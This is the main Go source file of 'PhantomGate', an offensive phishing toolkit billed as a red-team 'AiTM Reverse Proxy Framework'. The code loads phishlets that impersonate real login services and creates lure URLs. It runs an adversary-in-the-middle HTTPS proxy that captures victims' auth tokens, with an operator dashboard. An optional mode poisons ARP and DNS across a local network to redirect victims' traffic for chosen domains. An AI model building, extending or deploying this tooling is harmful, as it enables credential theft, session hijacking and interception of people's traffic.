package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"log"
	"net"
	"net/http"
	"os"
	"os/signal"
	"strings"
	"syscall"

	"github.com/phantomgate/phantomgate/internal/capture"
	"github.com/phantomgate/phantomgate/internal/config"
	"github.com/phantomgate/phantomgate/internal/dashboard"
	pgdns "github.com/phantomgate/phantomgate/internal/dns"
	"github.com/phantomgate/phantomgate/internal/lure"
	"github.com/phantomgate/phantomgate/internal/phishlet"
	"github.com/phantomgate/phantomgate/internal/proxy"
	"github.com/phantomgate/phantomgate/internal/store"
)

const banner = `
   ██████╗ ██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ███╗
   ██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗ ████║
   ██████╔╝███████║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║
   ██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║
   ██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║
   ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝
              ██████╗  █████╗ ████████╗███████╗
             ██╔════╝ ██╔══██╗╚══██╔══╝██╔════╝
             ██║  ███╗███████║   ██║   █████╗
             ██║   ██║██╔══██║   ██║   ██╔══╝
             ╚██████╔╝██║  ██║   ██║   ███████╗
              ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝

   ─────────────────────────────────────────────────
     AiTM Reverse Proxy Framework for Red Teams
     Version: 1.0.0 | Cross-Platform (Linux/Win/Mac)
   ─────────────────────────────────────────────────
`

func main() {
	// CLI Flags
	domain := flag.String("domain", "", "Phishing domain (e.g., login-secure.com)")
	phishletName := flag.String("phishlet", "", "Phishlet to activate (e.g., microsoft365)")
	phishletDir := flag.String("phishlet-dir", "phishlets", "Directory containing phishlet YAML files")
	configFile := flag.String("config", "config.yml", "Path to config file")
	listenIP := flag.String("listen", "0.0.0.0", "IP to bind listeners on")
	httpsPort := flag.Int("https-port", 443, "HTTPS listener port")
	httpPort := flag.Int("http-port", 80, "HTTP redirect listener port")
	adminPort := flag.Int("admin-port", 8443, "Operator dashboard port")
	adminPass := flag.String("admin-pass", "", "Operator dashboard password")
	certFile := flag.String("cert", "", "TLS certificate file (PEM)")
	keyFile := flag.String("key", "", "TLS private key file (PEM)")
	storeFile := flag.String("store", "phantomgate_data.json", "Path to data store file")
	listPhishlets := flag.Bool("list", false, "List available phishlets and exit")
	createLure := flag.String("lure", "", "Create a lure URL for the specified victim info")

	// DNS Interception flags
	intercept := flag.Bool("intercept", false, "Enable DNS interception mode (ARP + DNS poisoning on LAN)")
	ifaceName := flag.String("iface", "eth0", "Network interface for interception")
	gatewayIP := flag.String("gateway", "", "Gateway IP for ARP poisoning")
	victimIPs := flag.String("victim-ip", "", "Comma-separated victim IPs (empty = entire subnet)")
	poisonDomains := flag.String("poison-domain", "", "Comma-separated domains to poison (e.g., instagram.com,facebook.com)")

	flag.Parse()

	fmt.Print(banner)

	// Load configuration
	cfg, err := config.LoadConfig(*configFile)
	if err != nil {
		log.Fatalf("[FATAL] Failed to load config: %v", err)
	}

	// Override config with CLI flags
	if *domain != "" {
		cfg.Domain = *domain
	}
	if *listenIP != "" {
		cfg.ListenIP = *listenIP
	}
	if *httpsPort != 0 {
		cfg.HTTPSPort = *httpsPort
	}
	if *httpPort != 0 {
		cfg.HTTPPort = *httpPort
	}
	if *adminPort != 0 {
		cfg.AdminPort = *adminPort
	}
	if *adminPass != "" {
		cfg.AdminPass = *adminPass
	}
	if *certFile != "" && *keyFile != "" {
		cfg.TLS.Mode = "manual"
		cfg.TLS.CertFile = *certFile
		cfg.TLS.KeyFile = *keyFile
	}

	// Load phishlets
	pm := phishlet.NewPhishletManager(*phishletDir)
	if err := pm.LoadAll(); err != nil {
		log.Fatalf("[FATAL] Failed to load phishlets: %v", err)
	}

	// List mode
	if *listPhishlets {
		fmt.Println("\n  Available Phishlets:")
		fmt.Println("  " + strings.Repeat("─", 40))
		for _, name := range pm.List() {
			p, _ := pm.Get(name)
			hosts := make([]string, 0)
			for _, h := range p.ProxyHosts {
				hosts = append(hosts, h.OrigSub)
			}
			fmt.Printf("    • %-20s → %s\n", name, strings.Join(hosts, ", "))
		}
		fmt.Println()
		os.Exit(0)
	}

	// Validate required flags
	if cfg.Domain == "" {
		log.Fatal("[FATAL] --domain is required. Example: --domain login-secure.com")
	}
	if *phishletName == "" {
		log.Fatal("[FATAL] --phishlet is required. Use --list to see available phishlets.")
	}

	activePhishlet, ok := pm.Get(*phishletName)
	if !ok {
		log.Fatalf("[FATAL] Phishlet '%s' not found. Use --list to see available phishlets.", *phishletName)
	}

	// Initialize data store
	dataStore := store.NewStore(*storeFile)

	// Initialize lure generator
	lureGen := lure.NewGenerator(cfg.Domain)

	// Create lure if requested
	if *createLure != "" {
		newLure := lureGen.Create(*phishletName, "/", *createLure, "")
		fmt.Printf("\n  [✓] Lure Created:\n")
		fmt.Printf("      ID:  %s\n", newLure.ID)
		fmt.Printf("      URL: %s\n\n", lureGen.GetURL(newLure))
	}

	// Initialize the AiTM reverse proxy
	phantomProxy := proxy.NewPhantomProxy(cfg, activePhishlet, dataStore)

	// Print startup info
	fmt.Println("\n  ┌─────────────────────────────────────────────┐")
	fmt.Println("  │         PHANTOMGATE ENGINE ACTIVE            │")
	fmt.Println("  └─────────────────────────────────────────────┘")
	fmt.Printf("  🌐 Phishing Domain  : %s\n", cfg.Domain)
	fmt.Printf("  🎯 Active Phishlet  : %s (%s)\n", activePhishlet.Name, *phishletName)
	fmt.Printf("  🔒 HTTPS Proxy      : %s:%d\n", cfg.ListenIP, cfg.HTTPSPort)
	fmt.Printf("  📡 HTTP Redirect    : %s:%d\n", cfg.ListenIP, cfg.HTTPPort)
	fmt.Printf("  🖥️  Operator Panel   : http://%s:%d\n", cfg.ListenIP, cfg.AdminPort)
	fmt.Printf("  📦 Data Store       : %s\n", *storeFile)
	fmt.Println()

	fmt.Println("  Host Mappings:")
	for phishHost, realHost := range activePhishlet.GetHostMappings(cfg.Domain) {
		fmt.Printf("    %s → %s\n", phishHost, realHost)
	}
	fmt.Println()

	fmt.Println("  Auth Tokens to Capture:")
	for _, at := range activePhishlet.AuthTokens {
		fmt.Printf("    [%s] %s\n", at.Domain, strings.Join(at.Keys, ", "))
	}
	fmt.Println()

	// Start HTTP → HTTPS redirect server
	go func() {
		redirectMux := http.NewServeMux()
		redirectMux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
			target := "https://" + r.Host + r.URL.RequestURI()
			http.Redirect(w, r, target, http.StatusMovedPermanently)
		})
		addr := phantomProxy.GetHTTPAddr()
		log.Printf("[→] HTTP redirect listener on %s", addr)
		if err := http.ListenAndServe(addr, redirectMux); err != nil {
			log.Printf("[!] HTTP redirect listener failed: %v", err)
		}
	}()

	// Start operator dashboard
	go func() {
		dashSrv := dashboard.NewServer(dataStore, lureGen, cfg.AdminPass)
		addr := fmt.Sprintf("%s:%d", cfg.ListenIP, cfg.AdminPort)
		if err := dashSrv.Start(addr); err != nil {
			log.Printf("[!] Dashboard server failed: %v", err)
		}
	}()

	// Start the main HTTPS AiTM proxy
	go func() {
		tlsConfig, err := phantomProxy.CreateTLSConfig()
		if err != nil {
			log.Fatalf("[FATAL] TLS setup failed: %v", err)
		}

		addr := phantomProxy.GetListenAddr()
		server := &http.Server{
			Addr:      addr,
			Handler:   phantomProxy,
			TLSConfig: tlsConfig,
		}

		ln, err := tls.Listen("tcp", addr, tlsConfig)
		if err != nil {
			log.Fatalf("[FATAL] Failed to start HTTPS listener on %s: %v", addr, err)
		}

		log.Printf("[🔴 ACTIVE] HTTPS AiTM proxy listening on %s", addr)
		if err := server.Serve(ln); err != nil {
			log.Fatalf("[FATAL] HTTPS server failed: %v", err)
		}
	}()

	// === DNS INTERCEPTION MODE ===
	var interceptSuite *pgdns.InterceptSuite
	if *intercept {
		if *gatewayIP == "" {
			log.Fatal("[FATAL] --gateway is required for interception mode")
		}

		// Parse victim IPs
		var victims []string
		if *victimIPs != "" {
			for _, ip := range strings.Split(*victimIPs, ",") {
				victims = append(victims, strings.TrimSpace(ip))
			}
		}

		// Parse poison domains (default: use phishlet proxy hosts)
		var domains []string
		if *poisonDomains != "" {
			for _, d := range strings.Split(*poisonDomains, ",") {
				domains = append(domains, strings.TrimSpace(d))
			}
		} else {
			// Auto-detect from phishlet
			for _, h := range activePhishlet.ProxyHosts {
				domains = append(domains, h.OrigSub)
			}
		}

		// Determine our IP for redirection
		redirectIP := cfg.ListenIP
		if redirectIP == "0.0.0.0" {
			// Try to get the IP of the specified interface
			redirectIP = *gatewayIP // Fallback; will be overridden
			if iface, err := net.InterfaceByName(*ifaceName); err == nil {
				if addrs, err := iface.Addrs(); err == nil {
					for _, addr := range addrs {
						if ipNet, ok := addr.(*net.IPNet); ok && ipNet.IP.To4() != nil {
							redirectIP = ipNet.IP.String()
							break
						}
					}
				}
			}
		}

		var err error
		interceptSuite, err = pgdns.NewInterceptSuite(pgdns.InterceptConfig{
			Interface:     *ifaceName,
			GatewayIP:     *gatewayIP,
			RedirectIP:    redirectIP,
			TargetDomains: domains,
			VictimIPs:     victims,
			ARPInterval:   2,
		})
		if err != nil {
			log.Fatalf("[FATAL] Interception suite failed: %v", err)
		}

		if err := interceptSuite.Start(); err != nil {
			log.Fatalf("[FATAL] Failed to start interception: %v", err)
		}
	}

	fmt.Println("  ⚡ PhantomGate is LIVE. Waiting for victims...")
	if *intercept {
		fmt.Println("  ☠️  DNS interception mode ACTIVE — victims' DNS is being poisoned")
	}
	fmt.Println("  Press Ctrl+C to shutdown.\n")

	// Graceful shutdown
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	<-sigChan

	fmt.Println("\n  [!] Shutting down PhantomGate...")

	// Stop interception first (restore network state)
	if interceptSuite != nil {
		interceptSuite.Stop()
	}

	fmt.Println("  [✓] All data saved. Goodbye.\n")
}

// Silence unused import warnings
var _ = capture.ReadBody
